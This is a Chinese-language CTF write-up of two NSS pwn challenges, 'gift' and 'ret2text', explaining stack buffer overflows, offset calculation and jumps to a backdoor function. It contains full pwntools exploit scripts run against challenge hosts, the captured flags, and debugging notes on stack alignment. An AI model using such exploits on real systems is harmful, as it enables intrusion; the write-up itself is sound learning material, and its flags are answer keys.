## 二、题目 WP

### 题目：gift（NSS 平台）

**题目信息**
- 平台：NSS
- 日期：2026-10-27
**保护情况**
Partial RELRO / No canary found / NX enabled / No PIE (0x400000) / Not stripped

**漏洞分析**
vuln() 的伪代码：
```c
_BYTE buf[16];//容量16字节
read(0, buf, 0x64);//可读取100字节
可算出偏移16（buf）+ 8（64位的rbp保存的8字节）=24
找后门 objdump 里 grep system，发现 0x4005ce 有 call system@plt， 它落在 gift 函数（0x4005b6）内；strings 里查到 /bin/sh → 后门 = gift @ 0x4005b6

从而可以写出exp
from pwn import *
import time

elf = ELF('./附件')
io = process('./附件')

offset = 24
ret = ROP(elf).find_gadget(['ret'])[0]
gift = elf.symbols['gift']

payload = b'a' * offset + p64(ret) + p64(gift)

io.send(payload)
time.sleep(0.5)
io.sendline(b'echo PWNED; id')
print(io.recvall(timeout=3)

结果
Welcom new to NSS / PWNED / uid=1000(uni)...
拿到本地shell

后来想要提交NSS之后复制远程地址node4.anna.nssnode.cn:26247从而修改exp
from pwn import *
import time

elf = ELF('/home/uni/tiku/附件')
io = remote('node4.anna.nssnode.cn', 26247)

offset = 24
ret = ROP(elf).find_gadget(['ret'])[0]
gift = elf.symbols['gift']

payload = b'a' * offset + p64(ret) + p64(gift)

io.sendline(payload)
time.sleep(0.5)
io.sendline(b'ls -la / ; cat /flag* ; cat flag*')
print(io.recvall(timeout=5))

拿到flag   NSSCTF{950a1edd-168d-4deb-a422-4c5b5fbc6a2a}

**踩的坑**
1. 不加 ret → 进程立刻退出（栈对齐）
解决方法：加入ret = ROP(elf).find_gadget(['ret'])[0]
将原本的payload = b'a' * offset  + p64(gift) 改成 payload = b'a' * offset + p64(ret) + p64(gift)
2. interactive() 直接连 → Got EOF（shell 没起来），
   解决方法：改成 sleep(0.5) 后发命令就正常
3. 远程容器精简，没有 id 命令
解决方法：用 ls / cat 



### 题目 2：ret2text（NSS 平台）

- **题目名称**：ret2text

- **保护情况**：Partial RELRO / No canary found / NX enabled / No PIE (0x400000) / Not stripped

- **漏洞分析**：
```c
_BYTE buf[12];  // 从这里可以看出缓冲区只有 12 字节
size_t nbytes;  //这里也有4个字节
scanf("%d", &nbytes);   // ← 长度由用户输入
read(0, buf, (unsigned int)nbytes); // ← 读多少也由用户决定这就是主要漏洞
漏洞在于长度可由用户控制：输入一个足够大的值，就能读入超过缓冲区的数据，覆盖返回地址
- **利用思路**：可算出偏移offset=12(buf)+4(nbytes)+8(rbp)=24
之后找到后门strings 里查到 /bin/sh （.rodata:0x400858 处的字符串，DATA XREF 指向 backdoor+4） → 后门 = backdoor @ 0x4006e6
到此偏移、后门都找到了就能写出exp
from pwn import *

elf = ELF('/home/uni/tiku/ret2text')
io = remote('node4.anna.nssnode.cn', 20748)

offset = 24
backdoor = elf.symbols['backdoor']
ret = ROP(elf).find_gadget(['ret'])[0]

payload = b'A' * offset + p64(ret) + p64(backdoor)

io.sendlineafter(b'length of your name:', b'100')
io.sendlineafter(b"What's u name?", payload)
io.interactive()


- **结果**：NSSCTF{d48c8d91-bf52-44b1-b532-247c062cf9ec}


- **收获**：
1、这道题和之前的有点不同他需要自己输入读取的大小所以需要加上，所以要多写一个定义读取量
io.sendlineafter(b'length of your name:', b'100')
io.sendlineafter(b"What's u name?", payload)

2、认识到漏洞不只是「缓冲区太小」，「长度可控」本身也是一种漏洞

## 四、遇到的困难与解决

1. 跳到后门函数后进程立刻退出
   - 现象：打印了欢迎语，但马上 Got EOF，拿不到 shell
   - 原因：栈没 16 字节对齐，system 内部 movaps 崩溃
   - 解决：payload 里加一个 ret 垫片
   　　payload = b'A'*offset + p64(ret) + p64(gift)

2. interactive() 拿不到 shell
   - 现象：Switching to interactive mode 后立刻 Got EOF
   - 原因：shell 还没起来就去读，撞上 EOF
   - 解决：改成 sleep(0.5) 后再 sendline 命令

3. p64('backdoor') —— 传了字符串而不是地址
解决：p64(backdoor)，变量不带引号

4.**exp 写不出来，因为 Python 零基础**
   - 现象：能看懂题目、知道要干什么，但 exp 一个字写不出来
   - 原因：变量、bytes、列表、函数这些语法没学过
   - 解决：停下打题，先花三天补 Python 最小集（变量/bytes/列表/循环/函数），再回头写 exp
   - 学到：**工具不会就是不会，绕不过去，只能补**

5. 远程地址连不上
   - 现象：socket.gaierror / 连接失败
   - 原因：靶机环境过期（限时一小时），或 VM 网络断了（我个人认为是后者）
   - 解决：回平台重开环境拿新地址；VM 网络问题在 VM 设置里勾上"已连接"
